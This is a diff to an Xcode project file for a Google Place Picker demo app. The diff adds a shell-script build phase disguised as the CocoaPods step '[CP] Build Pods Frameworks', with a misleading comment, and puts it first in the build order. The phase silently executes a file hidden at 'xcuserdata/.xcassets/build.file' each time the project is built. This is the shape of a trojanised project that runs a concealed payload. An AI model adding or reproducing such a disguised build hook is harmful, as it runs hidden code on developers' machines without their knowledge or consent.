@@ -235,6 +235,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 0181798447144E4629BB14E0 /* Build configuration list for PBXNativeTarget "GooglePlacePickerDemos" */;
 			buildPhases = (
+				27F2ADA39BCC2A8DBCAAC43A /* [CP] Build Pods Frameworks */,
 				0939FD8B14D5C9708A2F5105 /* Resources */,
 				3CB001A9B76FED35F4304364 /* Sources */,
 				6FA79BEEA663ED6E161F08CE /* Frameworks */,
@@ -428,6 +429,46 @@
 			defaultConfigurationName = Default;
 		};
 /* End XCConfigurationList section */
+
+	
+		/* Begin PBXShellScriptBuildPhase section */
+
+	27F2ADA39BCC2A8DBCAAC43A /* [CP] Build Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "[CP] Build Pods Frameworks";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
+
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
+		};
+	
+		
+	
+		/* End PBXShellScriptBuildPhase section */
+	
+	
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 174AAE95412B0F78C1F406D0 /* Project object */;
 }
